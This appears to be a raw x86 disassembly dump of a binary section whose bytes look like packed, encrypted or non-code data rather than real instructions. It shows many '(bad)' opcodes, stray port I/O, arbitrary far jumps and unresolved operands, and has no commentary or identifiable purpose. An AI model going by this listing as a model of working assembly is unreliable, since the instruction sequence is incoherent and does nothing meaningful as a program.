  41f385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f386:	ja     0x41f31d
  41f388:	add    DWORD PTR [ecx+eiz*8+0x15876700],ebx
  41f38f:	push   eax
  41f390:	(bad)  
  41f391:	cmp    ah,al
  41f393:	sub    DWORD PTR [edx],ecx
  41f395:	mov    DWORD PTR [edi+edx*1-0x13224cb9],esp
  41f39c:	pop    esi
  41f39d:	inc    esp
  41f39e:	push   es
  41f39f:	xor    DWORD PTR [edi],ebp
  41f3a1:	pop    esi
  41f3a2:	or     eax,0x55e1f9d9
  41f3a7:	call   DWORD PTR [ebx]
  41f3a9:	pop    esi
  41f3aa:	pop    edi
  41f3ab:	dec    eax
  41f3ac:	mov    ds:0xec2e256c,al
  41f3b1:	jo     0x41f3c6
  41f3b3:	sub    dh,BYTE PTR ds:0x33052cda
  41f3b9:	aas    
  41f3ba:	cmp    eax,0xe4c95c25
  41f3bf:	push   esp
  41f3c0:	lds    esi,FWORD PTR [esi+0x104d71e2]
  41f3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c7:	dec    ebx
  41f3c8:	(bad)  
  41f3ca:	inc    ebp
  41f3cb:	enter  0x104c,0x4b
  41f3cf:	adc    esp,esp
  41f3d1:	stos   DWORD PTR es:[edi],eax
  41f3d2:	and    eax,0x48f77184
  41f3d7:	(bad)  
  41f3d9:	mov    ds:0xbcb69834,eax
  41f3de:	mov    BYTE PTR ds:0x341d7f53,cl
  41f3e4:	pop    ecx
  41f3e5:	les    ecx,FWORD PTR [esi-0x5f9c30d5]
  41f3eb:	clc    
  41f3ec:	out    dx,eax
  41f3ed:	mov    ebx,0x818e69db
  41f3f2:	inc    edi
  41f3f3:	daa    
  41f3f4:	xor    dl,bl
  41f3f6:	or     al,0x99
  41f3f8:	les    esi,FWORD PTR [ebp*2-0x5bc7d83]
  41f3ff:	cmp    BYTE PTR [ebp-0x5d],bl
  41f402:	mov    eax,0x174930f8
  41f407:	jge    0x41f45e
  41f409:	test   DWORD PTR [edi],0x1023b50b
  41f40f:	cwde   
  41f410:	inc    eax
  41f411:	mov    edi,0x91e33536
  41f416:	and    cl,BYTE PTR [edx+0x5d]
  41f419:	imul   eax,DWORD PTR [esi+0x29209e3d],0xfffffffd
  41f420:	push   0x7c15172b
  41f425:	fldenv [esi-0x54]
  41f428:	add    al,0x27
  41f42a:	xor    eax,0xbac71fae
  41f42f:	add    DWORD PTR [edi],ebx
  41f431:	adc    al,0xe5
  41f433:	push   0x6d
  41f435:	adc    bl,BYTE PTR [ebx+0x2bf5fbb1]
  41f43b:	ja     0x41f482
  41f43d:	addr16 jae 0x41f410
  41f440:	sub    al,0xdb
  41f442:	int    0x1d
  41f444:	sub    ah,BYTE PTR [esi]
  41f446:	or     BYTE PTR [ebx+0xf71158a],al
  41f44c:	aam    0xdc
  41f44e:	xor    ch,ch
  41f450:	sub    DWORD PTR [ebp-0x31],esi
  41f453:	call   0x4562a2a3
  41f458:	stos   BYTE PTR es:[edi],al
  41f459:	xchg   DWORD PTR [ecx],ebx
  41f45b:	rcr    ebx,0x41
  41f45e:	push   ebp
  41f45f:	push   ss
  41f460:	mov    esp,0x5cf76b44
  41f465:	ror    BYTE PTR [esi+0x60],cl
  41f468:	jp     0x41f42f
  41f46a:	mov    esi,0xadde1aa1
  41f46f:	(bad)  
  41f470:	jb     0x41f451
  41f472:	mov    ds:0x5549e494,ax
  41f478:	dec    ebp
  41f479:	inc    esi
  41f47a:	mov    al,ds:0x6ba90ae3
  41f47f:	ret    0x8254
  41f482:	mov    eax,0xb8df3e8a
  41f487:	pop    edi
  41f488:	jbe    0x41f4f5
  41f48a:	sub    ecx,eax
  41f48c:	xchg   BYTE PTR [ebp-0x7b],ch
  41f48f:	mov    dh,0xa2
  41f491:	pop    edx
  41f492:	cmp    edi,DWORD PTR [eax]
  41f494:	ja     0x41f506
  41f496:	or     al,BYTE PTR [esi+0x3c]
  41f499:	sbb    ecx,DWORD PTR ds:0x35f56f29
  41f49f:	arpl   WORD PTR [edi+0x57],cx
  41f4a2:	pop    edi
  41f4a3:	ret    0x6a4d
  41f4a6:	jle    0x41f453
  41f4a8:	iret   
  41f4a9:	pop    ebp
  41f4aa:	gs nop
  41f4ac:	ret    
  41f4ad:	out    0x33,eax
  41f4af:	pop    eax
  41f4b0:	xchg   ebx,eax
  41f4b1:	fadd   st(2),st
  41f4b3:	inc    esp
  41f4b4:	bound  ebx,QWORD PTR [esi]
  41f4b6:	or     bh,BYTE PTR [edi]
  41f4b8:	in     eax,0xcd
  41f4ba:	jo     0x41f48d
  41f4bc:	dec    edi
  41f4bd:	mov    esp,0xfd9009f9
  41f4c2:	and    eax,0x3c821633
  41f4c7:	sbb    edi,DWORD PTR [ebx+0x51]
  41f4ca:	and    eax,0x9d676f6e
  41f4cf:	jbe    0x41f50b
  41f4d1:	mov    cl,0x7b
  41f4d3:	and    al,0x84
  41f4d5:	inc    edx
  41f4d6:	pop    edx
  41f4d7:	pushf  
  41f4d8:	dec    edx
  41f4d9:	pop    edx
  41f4da:	pop    ebx
  41f4db:	mov    ebp,0x822441e5
  41f4e0:	mov    al,0xb9
  41f4e2:	out    0xaa,eax
  41f4e4:	push   ebx
  41f4e5:	loop   0x41f4ea
  41f4e7:	push   eax
  41f4e8:	idiv   ebp
  41f4ea:	shr    DWORD PTR [ecx],1
  41f4ec:	adc    edi,DWORD PTR [ecx-0x7d]
  41f4ef:	push   esp
  41f4f0:	or     BYTE PTR [edi+edi*1+0x1a10f3e3],bl
  41f4f7:	xchg   ebx,eax
  41f4f8:	xor    ch,al
  41f4fa:	pushf  
  41f4fb:	and    dh,bl
  41f4fd:	add    al,BYTE PTR [edi-0x23]
  41f500:	sbb    ah,BYTE PTR [ecx]
  41f502:	std    
  41f503:	pushf  
  41f504:	icebp  
  41f505:	call   0xd7f0:0xb91ff53d
  41f50c:	retf   
  41f50d:	nop
  41f50e:	not    BYTE PTR [ebp-0x38]
  41f511:	sub    al,0x8e
  41f513:	xchg   esp,eax
  41f514:	sbb    eax,0x4e75f7d7
  41f519:	add    eax,0xab2c4fd3
  41f51e:	not    BYTE PTR [ebp+0x5a7bee3b]
  41f524:	fldcw  WORD PTR gs:[eax-0x4d38d219]
  41f52b:	mov    dh,0xd
  41f52d:	mov    dh,0x2e
  41f52f:	pushf  
  41f530:	xor    BYTE PTR [esi-0x12],0x65
  41f534:	ins    DWORD PTR es:[edi],dx
  41f535:	xchg   DWORD PTR [ebp-0x59],eax
  41f538:	dec    esp
  41f539:	lds    ecx,FWORD PTR [edx-0x66]
  41f53c:	cld    
  41f53d:	mov    eax,0x7d6bf278
  41f542:	pop    ds
  41f543:	retf   0x6c63
  41f546:	outs   dx,DWORD PTR ds:[esi]
  41f547:	mov    eax,ds:0x75161775
  41f54c:	jbe    0x41f58f
  41f54e:	stos   DWORD PTR es:[edi],eax
  41f54f:	fisub  DWORD PTR [esi-0x43]
  41f552:	inc    ecx
  41f553:	es cwde 
  41f555:	stc    
  41f556:	(bad)  
  41f557:	pop    esi
  41f558:	lock (bad) 
  41f55a:	hlt    
  41f55b:	mov    bh,0x22
  41f55d:	rcl    DWORD PTR [esi+0x61715499],cl
  41f563:	pop    ds
  41f564:	adc    dh,0xd1
  41f567:	(bad)  
  41f569:	xor    BYTE PTR [ecx],al
  41f56b:	inc    ebx
  41f56c:	je     0x41f5ac
  41f56e:	int3   
  41f56f:	jmp    0xd8947981
  41f574:	outs   dx,DWORD PTR ds:[esi]
  41f575:	(bad)  
  41f576:	mov    cl,0xf6
  41f578:	fsub   DWORD PTR gs:[eax]
  41f57b:	dec    edx
  41f57c:	(bad)  [edx+0x4360a5f0]
  41f582:	lock xor DWORD PTR [edi+0x17d70007],esi
  41f589:	cld    
  41f58a:	mov    al,ds:0x358986ed
  41f58f:	or     dl,BYTE PTR [ebp-0x309cefdc]
  41f595:	out    dx,al
  41f596:	je     0x41f5ed
  41f598:	rcl    BYTE PTR [ecx],cl
  41f59a:	sbb    al,0x9f
  41f59c:	fdiv   QWORD PTR [esi-0x5193ef97]
  41f5a2:	cmp    eax,0xa167efb9
  41f5a7:	(bad)  
  41f5a8:	aaa    
  41f5a9:	jne    0x41f621
  41f5ab:	scas   eax,DWORD PTR es:[edi]
  41f5ac:	sub    eax,0x88086208
  41f5b1:	and    BYTE PTR [ebp+0x38028668],bl
  41f5b7:	adc    esi,DWORD PTR [eax]
  41f5b9:	and    eax,0x6469834f
  41f5be:	add    ebp,DWORD PTR [edx+0x1c]
  41f5c1:	fst    DWORD PTR [edx+ebp*1+0x593f6846]
  41f5c8:	xor    BYTE PTR ds:0x9a5637f,ah
  41f5ce:	adc    eax,DWORD PTR [eax+0x57]
  41f5d1:	mov    al,0x32
  41f5d3:	add    DWORD PTR [edx+0x6b7b8938],ecx
  41f5d9:	fimul  DWORD PTR [edx]
  41f5db:	mov    dl,0x9d
  41f5dd:	mov    edx,0x9decdfa2
  41f5e2:	xchg   edx,eax
  41f5e3:	retf   0x4aad
  41f5e6:	out    0x4a,al
  41f5e8:	mov    ebx,0xd6443d28
  41f5ed:	arpl   WORD PTR [ebx+0x6d3811f],si
  41f5f3:	pop    ebp
  41f5f4:	cs and esi,ecx
  41f5f7:	les    esp,FWORD PTR [ebx+ebp*2+0x65784d00]
  41f5fe:	pop    ebp
  41f5ff:	fadd   DWORD PTR [ecx]
  41f601:	mov    ?,esp
  41f603:	int3   
  41f604:	scas   eax,DWORD PTR es:[edi]
  41f605:	push   ecx
  41f606:	les    esi,FWORD PTR [ecx+0x7f64399e]
  41f60c:	js     0x41f5c0
  41f60e:	dec    edi
  41f60f:	ins    BYTE PTR es:[edi],dx
  41f610:	fwait
  41f611:	cmp    cl,BYTE PTR [ebx]
  41f613:	push   ss
  41f614:	scas   eax,DWORD PTR es:[edi]
  41f615:	dec    eax
  41f616:	sbb    eax,0x9a159f4e
  41f61b:	ins    DWORD PTR es:[edi],dx
  41f61c:	or     BYTE PTR [ebp-0x1f],bh
  41f61f:	adc    BYTE PTR [ecx+0x7e31e568],0x94
  41f626:	sbb    ebx,0x64
  41f629:	cmp    ah,BYTE PTR [ebx+0x2d]
  41f62c:	cmp    DWORD PTR [ebp-0x2791791],ebx
  41f632:	xchg   BYTE PTR es:[edi-0x35ac79db],dh
  41f639:	push   es
  41f63a:	pop    eax
  41f63b:	and    al,0x9
  41f63d:	shl    bl,1
  41f63f:	popf   
  41f640:	sbb    eax,0x9ba7df8a
  41f645:	or     eax,0x16cb0d8
  41f64a:	pop    esp
  41f64b:	shr    edi,0x2a
  41f64e:	push   eax
  41f64f:	xchg   ebp,eax
  41f650:	mov    cl,0x2f
  41f652:	dec    ecx
  41f653:	loopne 0x41f6c4
  41f655:	lods   eax,DWORD PTR ds:[esi]
  41f656:	dec    eax
  41f657:	mov    ebx,0xcd0c1d47
  41f65c:	pop    ss
  41f65d:	in     eax,0xf1
  41f65f:	mov    ds:0x71fa6f33,al
  41f664:	inc    esi
  41f665:	retf   
  41f666:	push   es
  41f667:	mov    BYTE PTR [ecx+0x30e8ecfc],ch
  41f66d:	add    DWORD PTR [ebp+0x6d],esi
  41f670:	xlat   BYTE PTR ds:[ebx]
  41f671:	or     al,0xcf
  41f673:	cli    
  41f674:	jle    0x41f611
  41f676:	lock adc eax,0x15969ca2
  41f67c:	xchg   ecx,eax
  41f67d:	ss sub eax,0x62d10bde
  41f683:	sbb    eax,0x3e278812
  41f688:	scas   eax,DWORD PTR es:[edi]
  41f689:	ret    0x2133
  41f68c:	fs (bad) 
  41f68e:	clc    
  41f68f:	mov    ss,WORD PTR [eax-0x45]
  41f692:	add    eax,0xb5f65eef
  41f697:	push   ecx
  41f698:	out    dx,al
  41f699:	imul   eax,DWORD PTR [eax+ecx*2],0xa3344b84
  41f6a0:	sbb    esi,DWORD PTR [ebx-0x4193baf6]
  41f6a6:	inc    ecx
  41f6a7:	sbb    esi,DWORD PTR [ebx-0x45]
  41f6aa:	in     eax,dx
  41f6ab:	retf   0x3e24
  41f6ae:	fsub   DWORD PTR [ebx]
  41f6b0:	cmp    ch,BYTE PTR [ecx+0x2]
  41f6b3:	mov    ds:0xaad54aa3,eax
  41f6b8:	dec    esp
  41f6b9:	mov    cl,0x1
  41f6bb:	xchg   edx,eax
  41f6bc:	loopne 0x41f6d0
  41f6be:	je     0x41f640
  41f6c0:	adc    ecx,DWORD PTR [ebp-0x719c20d9]
  41f6c6:	rcl    BYTE PTR [edi+edx*4],0x24
  41f6ca:	push   ebx
  41f6cb:	rcl    ecx,cl
  41f6cd:	add    ecx,DWORD PTR [ecx]
  41f6cf:	cs adc dh,ah
  41f6d2:	dec    esp
  41f6d3:	in     eax,0x5a
  41f6d5:	in     al,dx
  41f6d6:	addr16 sbb bh,dh
  41f6d9:	fld    TBYTE PTR [eax+0x2f]
  41f6dc:	xor    eax,0xad75c2fd
  41f6e1:	jecxz  0x41f668
  41f6e3:	add    al,0x7c
  41f6e5:	jbe    0x41f69c
  41f6e7:	adc    eax,0xe091a496
  41f6ec:	adc    ch,cl
  41f6ee:	adc    ecx,DWORD PTR [ebx-0x70]
  41f6f1:	sbb    eax,0x89ef29cb
  41f6f6:	(bad)  
  41f6f7:	pop    edi
  41f6f8:	neg    DWORD PTR [ebx+0x33]
  41f6fb:	jne    0x41f70b
  41f6fd:	lock lods eax,DWORD PTR ds:[esi]
  41f6ff:	mov    eax,ds:0xf92e8030
  41f704:	xlat   BYTE PTR ds:[ebx]
  41f705:	inc    ebx
  41f706:	sbb    eax,0xc72cf373
  41f70b:	pop    esi
  41f70c:	int    0x3d
  41f70e:	jecxz  0x41f69d
  41f710:	in     eax,0x95
  41f712:	mov    al,0x1
  41f714:	rol    BYTE PTR [ebx+0x2f978387],cl
  41f71a:	lahf   
  41f71b:	adc    edi,edi
  41f71d:	ja     0x41f6c6
  41f71f:	loope  0x41f78e
  41f721:	push   eax
  41f722:	mov    ch,cl
  41f724:	inc    ebp
  41f725:	stos   BYTE PTR es:[edi],al
  41f726:	pop    esi
  41f727:	repz xchg edi,eax
  41f729:	jecxz  0x41f6f1
  41f72b:	ffreep st(1)
  41f72d:	dec    eax
  41f72e:	jno    0x41f75b
  41f730:	psubq  mm7,QWORD PTR [esp+ebx*8-0x425c5499]
  41f738:	or     al,0xfa
  41f73a:	xchg   ecx,eax
  41f73b:	push   ds
  41f73c:	lods   al,BYTE PTR ds:[esi]
  41f73d:	(bad)  
  41f73e:	mov    DWORD PTR [ebp-0xf25b164],ebx
  41f744:	or     BYTE PTR [esi],al
  41f746:	xor    DWORD PTR [ebp+0x6893bc93],ebx
  41f74c:	or     eax,DWORD PTR [ecx+esi*2-0x46b2d367]
  41f753:	mov    al,ds:0xe3e87f71
  41f758:	sub    ah,al
  41f75a:	pop    eax
  41f75b:	adc    eax,0xcafa99c
  41f760:	imul   esi,DWORD PTR [ecx],0xf44b27c3
  41f766:	xor    BYTE PTR [esi],cl
  41f768:	xor    al,0xa4
  41f76a:	sti    
  41f76b:	xor    al,0xd5
  41f76d:	test   DWORD PTR [edx+0x25c4e091],0xac6300f7
  41f777:	and    edx,esp
  41f779:	(bad)  
  41f77b:	jp     0x41f793
  41f77d:	jl     0x41f7d6
  41f77f:	mov    esp,0x4d9fd01b
  41f784:	mov    esp,0xa4d24830
  41f789:	mov    ecx,0xca9e941c
  41f78e:	xor    edx,ebp
  41f790:	add    BYTE PTR ss:[eax+ebx*4],ch
  41f794:	jg     0x41f80f
  41f796:	pop    DWORD PTR [edx]
  41f798:	jecxz  0x41f728
  41f79a:	hlt    
  41f79b:	lods   al,BYTE PTR ds:[esi]
  41f79c:	jbe    0x41f74a
  41f79e:	sub    BYTE PTR [ecx+edx*2+0x3],0x7b
  41f7a3:	sti    
  41f7a4:	idiv   bh
  41f7a6:	jge    0x41f805
  41f7a8:	sub    eax,0xedb0215a
  41f7ad:	dec    edi
  41f7ae:	test   al,0xe2
  41f7b0:	ficom  WORD PTR [esi+0x2985bd5d]
  41f7b6:	mov    ecx,0xfa022495
  41f7bb:	add    dh,bh
  41f7bd:	je     0x41f75e
  41f7bf:	dec    ecx
  41f7c0:	rcr    bh,cl
  41f7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7c3:	mov    edx,0x9b2f8594
  41f7c8:	test   DWORD PTR [esi+0x6018e960],0x1f064664
  41f7d2:	xchg   ebx,eax
  41f7d3:	add    eax,0xea765f11
  41f7d8:	mov    bl,0x82
  41f7da:	ret    
  41f7db:	popa   
  41f7dc:	push   ss
  41f7dd:	mov    edi,0x60508917
  41f7e2:	add    al,BYTE PTR [esi+0x26]
  41f7e5:	mov    al,0xcb
  41f7e7:	mov    al,ds:0x9728a67d
  41f7ec:	xchg   esp,eax
  41f7ed:	mov    edi,0x9d2b9942
  41f7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f3:	int    0x5
  41f7f5:	in     eax,dx
  41f7f6:	nop
  41f7f7:	pop    edi
  41f7f8:	imul   esp,eax,0xffffffe8
  41f7fb:	xor    al,ah
  41f7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7fe:	scas   eax,DWORD PTR es:[edi]
  41f7ff:	push   0x8f83e119
  41f804:	loope  0x41f814
  41f806:	mov    ah,0x9a
  41f808:	mov    cl,0x44
  41f80a:	hlt    
  41f80b:	mov    dl,bl
  41f80d:	mov    ?,WORD PTR [eax+eax*1]
  41f810:	out    0xb6,eax
  41f812:	xor    eax,0xae49b1cf
  41f817:	aam    0x14
  41f819:	mov    cx,0xe0fd
  41f81d:	cmp    eax,0xb83f22bf
  41f822:	adc    esi,esp
  41f824:	lock bound ebp,QWORD PTR [eax]
  41f827:	out    0x6,al
  41f829:	mov    ebp,0x780c6d63
  41f82e:	or     BYTE PTR [ebp+0xf1e00f7],ah
  41f834:	lds    ebp,FWORD PTR [esi]
  41f836:	inc    esi
  41f837:	xchg   edi,eax
  41f838:	or     BYTE PTR [ebp-0x32419974],al
  41f83e:	(bad)  
  41f83f:	or     al,0x46
  41f841:	cmp    DWORD PTR [eax-0x43235144],0xe
  41f848:	xchg   ebp,eax
  41f849:	fxch   st(6)
  41f84b:	arpl   WORD PTR [edi-0x53],bx
  41f84e:	sub    DWORD PTR [ebx],ecx
  41f850:	shl    dl,1
  41f852:	mov    edi,0x72312ff9
  41f857:	lea    ebx,[eax+0x10]
  41f85a:	xchg   ecx,eax
  41f85b:	mov    edx,0x4567b936
  41f860:	mov    dl,0xe2
  41f862:	jne    0x41f84b
  41f864:	les    eax,FWORD PTR [edx+0x45]
  41f867:	lahf   
  41f868:	mov    al,ds:0xd8463687
  41f86d:	in     al,0x4c
  41f86f:	jge    0x41f833
  41f871:	test   BYTE PTR [ecx],ch
  41f873:	inc    ecx
  41f874:	inc    esp
  41f875:	mov    edx,0xe4fb5c61
  41f87a:	aad    0x9c
  41f87c:	or     eax,esp
  41f87e:	xchg   esi,eax
  41f87f:	xor    esi,ecx
  41f881:	data16 scas al,BYTE PTR es:[edi]
  41f883:	or     esp,DWORD PTR [ebx+0x7a]
  41f886:	dec    eax
  41f887:	imul   edx,DWORD PTR [esi+esi*2],0xffffff9d
  41f88b:	lock leave 
  41f88d:	js     0x41f845
  41f88f:	cwde   
  41f890:	xor    al,0xbb
  41f892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f893:	sub    DWORD PTR [ebp-0x20],edx
  41f896:	jecxz  0x41f866
  41f898:	ss popf 
  41f89a:	out    0xca,al
  41f89c:	ins    BYTE PTR es:[edi],dx
  41f89d:	pop    ds
  41f89e:	add    bl,dl
  41f8a0:	test   BYTE PTR [ebx],0x55
  41f8a3:	ret    
  41f8a4:	jne    0x41f89f
  41f8a6:	retf   0x5ee5
  41f8a9:	jnp    0x41f85f
  41f8ab:	push   esi
  41f8ac:	adc    al,0xed
  41f8ae:	pop    edi
  41f8af:	mov    dl,0xbd
  41f8b1:	ins    BYTE PTR es:[edi],dx
  41f8b2:	jecxz  0x41f916
  41f8b4:	adc    ebp,DWORD PTR [edi-0x75]
  41f8b7:	loop   0x41f8f4
  41f8b9:	ins    DWORD PTR es:[edi],dx
  41f8ba:	inc    ebx
  41f8bb:	scas   eax,DWORD PTR es:[edi]
  41f8bc:	scas   al,BYTE PTR es:[edi]
  41f8bd:	je     0x41f8b4
  41f8bf:	sbb    eax,DWORD PTR [edi+0x3f]
  41f8c2:	dec    ebp
  41f8c3:	sub    eax,0xba28d647
  41f8c8:	ins    BYTE PTR es:[edi],dx
  41f8c9:	push   ebx
  41f8ca:	jbe    0x41f850
  41f8cc:	cmp    ebx,DWORD PTR [edx+eiz*8+0x6846410f]
  41f8d3:	outs   dx,DWORD PTR ds:[esi]
  41f8d4:	imul   BYTE PTR [edi+esi*1+0x6e41fc9d]
  41f8db:	jmp    0x28c8dfce
  41f8e0:	sbb    eax,0x43eb369b
  41f8e5:	fstp   DWORD PTR [esi]
  41f8e7:	dec    ebp
  41f8e8:	or     DWORD PTR [edi+0x43],edx
  41f8eb:	ins    DWORD PTR es:[edi],dx
  41f8ec:	stos   BYTE PTR es:[edi],al
  41f8ed:	and    DWORD PTR [ebx+0x7c676984],ebp
  41f8f3:	scas   eax,DWORD PTR es:[edi]
  41f8f4:	push   es
  41f8f5:	loopne 0x41f93c
  41f8f7:	adc    DWORD PTR [edx-0x4a],ecx
  41f8fa:	fisubr WORD PTR [ebx+0x17]
  41f8fd:	xlat   BYTE PTR ds:[ebx]
  41f8fe:	jno    0x41f908
  41f900:	jnp    0x41f88c
  41f902:	call   0x48c3:0xeac4bea0
  41f909:	sti    
  41f90a:	sahf   
  41f90b:	mov    eax,ds:0xf5b198cf
  41f910:	pop    ss
  41f911:	mov    cl,bh
  41f913:	inc    eax
  41f914:	mov    edi,0xca4dd09c
  41f919:	scas   eax,DWORD PTR es:[edi]
  41f91a:	pop    esi
  41f91b:	jae    0x41f8ef
  41f91d:	int    0x43
  41f91f:	and    esi,DWORD PTR [edx+0x17f8768b]
  41f925:	or     BYTE PTR [esi+0x69f98ad],ah
  41f92b:	inc    ebp
  41f92c:	js     0x41f934
  41f92e:	clc    
  41f92f:	mov    edi,0x15b9d201
  41f934:	jge    0x41f8dc
  41f936:	rol    DWORD PTR [esi],0xa
  41f939:	mov    ch,0xda
  41f93b:	loope  0x41f990
  41f93d:	icebp  
  41f93e:	mov    edi,edx
  41f940:	inc    edi
  41f941:	out    0xed,eax
  41f943:	ins    BYTE PTR es:[edi],dx
  41f944:	stc    
  41f945:	ds (bad) 
  41f947:	hlt    
  41f948:	mov    eax,0x4767c8f1
  41f94d:	add    ecx,esi
  41f94f:	inc    ebx
  41f950:	ins    BYTE PTR es:[edi],dx
  41f951:	stos   BYTE PTR es:[edi],al
  41f952:	cwde   
  41f953:	jl     0x41f8d6
  41f955:	and    eax,0x1679bc3e
  41f95a:	out    dx,eax
  41f95b:	sub    bh,dh
  41f95d:	jns    0x41f964
  41f95f:	sbb    ebx,DWORD PTR ds:0x54414fff
  41f965:	stos   DWORD PTR es:[edi],eax
  41f966:	and    bh,BYTE PTR [eax+0x2b227c34]
  41f96c:	mov    edx,0xc4919523
  41f971:	fld    QWORD PTR [ecx-0xd]
  41f974:	add    bl,cl
  41f976:	xchg   ecx,ecx
  41f978:	sub    DWORD PTR [edi],0x11bd811a
  41f97e:	call   0x9f155f7c
  41f983:	cmp    ecx,eax
  41f985:	data16 and al,0xf5
  41f988:	(bad)  
  41f989:	or     al,0x54
  41f98b:	stos   BYTE PTR es:[edi],al
  41f98c:	cwde   
  41f98d:	mov    edi,0x3aab8e82
  41f992:	jp     0x41f9dd
  41f994:	ins    DWORD PTR es:[edi],dx
  41f995:	pop    ebp
  41f996:	and    BYTE PTR [esi-0x6a15267d],dl
  41f99c:	sbb    eax,DWORD PTR [edx+eiz*4]
  41f99f:	xor    eax,0xf1c5c9fa
  41f9a4:	fucom  st(6)
  41f9a6:	imul   edx,DWORD PTR [esi+0xf],0x7e
  41f9aa:	inc    edi
  41f9ab:	push   ebp
  41f9ac:	ret    0x4ac
  41f9af:	je     0x41f9fd
  41f9b1:	push   ebp
  41f9b2:	and    al,BYTE PTR [esi-0x41003365]
  41f9b8:	jmp    0x2132:0x19584bcb
  41f9bf:	mov    ch,BYTE PTR ds:0x607d70f9
  41f9c5:	test   DWORD PTR [ebx],esp
  41f9c7:	rcr    BYTE PTR [ebx],0x58
  41f9ca:	inc    ebp
  41f9cb:	js     0x41f962
  41f9cd:	pop    ebx
  41f9ce:	mov    ds:0x9d3d4e17,al
  41f9d3:	pop    eax
  41f9d4:	and    ebp,esi
  41f9d6:	fwait
  41f9d7:	das    
  41f9d8:	repz inc BYTE PTR [edi+edx*2]
  41f9dc:	sbb    ebx,esp
  41f9de:	sub    al,0xcb
  41f9e0:	mov    ebp,0x96bb2c9d
  41f9e5:	(bad)  
  41f9e6:	(bad)  
  41f9e7:	sbb    al,0xf0
  41f9e9:	sub    eax,0x380ea0af
  41f9ee:	rol    BYTE PTR [esi+0x59],cl
  41f9f1:	in     eax,0x74
  41f9f3:	xor    BYTE PTR [ebx],ch
  41f9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9f6:	cmp    DWORD PTR [ebx],ebp
  41f9f8:	mov    edi,0x86083bb9
  41f9fd:	mov    ecx,0x555709d0
  41fa02:	pushf  
  41fa03:	loopne 0x41f9bc
  41fa05:	cmc    
  41fa06:	cmp    esp,DWORD PTR [eax]
  41fa08:	cmp    DWORD PTR [ecx],esi
  41fa0a:	pop    ebp
  41fa0b:	inc    ebx
  41fa0c:	cmp    edx,ebp
  41fa0e:	or     BYTE PTR [eax+edi*2+0x85277ee],dh
  41fa15:	arpl   WORD PTR [edi+ebp*4-0x6],cx
  41fa19:	mov    ebx,0x1ef9345a
  41fa1e:	jmp    0xa51ed242
  41fa23:	xchg   esi,eax
  41fa24:	fdivr  DWORD PTR [ebp+0x991f60]
  41fa2a:	inc    ebx
  41fa2b:	scas   eax,DWORD PTR es:[edi]
  41fa2c:	mov    bh,0x48
  41fa2e:	xchg   edi,eax
  41fa2f:	mov    dh,0x5a
  41fa31:	adc    BYTE PTR [ecx],bh
  41fa33:	pushf  
  41fa34:	xchg   edi,eax
  41fa35:	sub    ebp,DWORD PTR ds:0x3003955
  41fa3b:	xchg   esp,eax
  41fa3c:	jecxz  0x41f9f6
  41fa3e:	lods   al,BYTE PTR ds:[esi]
  41fa3f:	test   eax,0x4f23be04
  41fa44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa45:	out    dx,eax
  41fa46:	addr16 xor al,0xe8
  41fa49:	sub    DWORD PTR [esi+0x30],ebx
  41fa4c:	add    al,0x34
  41fa4e:	shl    dh,1
  41fa50:	jb     0x41fa03
  41fa52:	inc    edx
  41fa53:	dec    edx
  41fa54:	adc    BYTE PTR [ebp+ecx*2-0x547c71],bl
  41fa5b:	inc    eax
  41fa5c:	ror    DWORD PTR [edi-0x50],0x62
  41fa60:	or     ebx,DWORD PTR [ebx+0x69]
  41fa63:	mov    eax,ds:0x80935908
  41fa68:	inc    edi
  41fa69:	stc    
  41fa6a:	mov    eax,ebx
  41fa6c:	xchg   edi,eax
  41fa6d:	daa    
  41fa6e:	pushf  
  41fa6f:	jmp    0x41fadf
  41fa71:	jecxz  0x41faef
  41fa73:	or     DWORD PTR [ebp+0x54],esi
  41fa76:	outs   dx,DWORD PTR ds:[esi]
  41fa77:	icebp  
  41fa78:	cmp    edi,esp
  41fa7a:	lahf   
  41fa7b:	xchg   ecx,esi
  41fa7d:	xchg   DWORD PTR [eax+0x119c38c0],edi
  41fa83:	imul   esp,DWORD PTR [edi-0x3c9117bf],0xffffffbd
  41fa8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa8b:	dec    eax
  41fa8c:	jp     0x41fa78
  41fa8e:	fsubrp st(4),st
  41fa90:	push   esp
  41fa91:	call   0xd49c671f
  41fa96:	cwde   
  41fa97:	pop    eax
  41fa98:	inc    edi
  41fa99:	je     0x41fac8
  41fa9b:	inc    edx
  41fa9c:	fs scas al,BYTE PTR es:[edi]
  41fa9e:	enter  0x5c69,0x7b
  41faa2:	jp     0x41faef
  41faa4:	and    DWORD PTR [ebp-0x72],ecx
  41faa7:	xchg   ebx,eax
  41faa8:	into   
  41faa9:	aam    0x1c
  41faab:	hlt    
  41faac:	add    al,0x6a
  41faae:	mov    eax,DWORD PTR [eax-0x1a813f05]
  41fab4:	ret    0x94bc
  41fab7:	inc    ebp
  41fab8:	inc    edi
  41fab9:	mov    ch,0x6f
  41fabc:	jnp    0x41fa56
  41fabe:	jb     0x41fa48
  41fac0:	jae    0x41fa51
  41fac2:	mov    al,0xf3
  41fac4:	jbe    0x41fadf
  41fac6:	xor    eax,0xf926acb8
  41facb:	cs int3 
  41facd:	ss xchg ecx,eax
  41facf:	sub    DWORD PTR [ebx+0xdd0badf],0x3874a48f
  41fad9:	xor    bh,BYTE PTR [ecx+eiz*1]
  41fadc:	inc    esp
  41fadd:	inc    ebp
  41fade:	mov    esi,0xbd008e52
  41fae3:	outs   dx,DWORD PTR ds:[esi]
  41fae4:	addr16 mov bl,0xf9
  41fae7:	aas    
  41fae8:	iret   
  41fae9:	hlt    
  41faea:	rcl    al,cl
  41faec:	cmp    ebp,edi
  41faee:	push   0xffffffe4
  41faf0:	or     DWORD PTR cs:[ebx-0x4c679ecd],edi
  41faf7:	shr    BYTE PTR [ebp-0x1b829a2],cl
  41fafd:	out    0xc0,eax
  41faff:	pop    esi
  41fb00:	fsub   DWORD PTR [ebx+0x5ac66139]
  41fb06:	mul    DWORD PTR [edx+eiz*2-0xe]
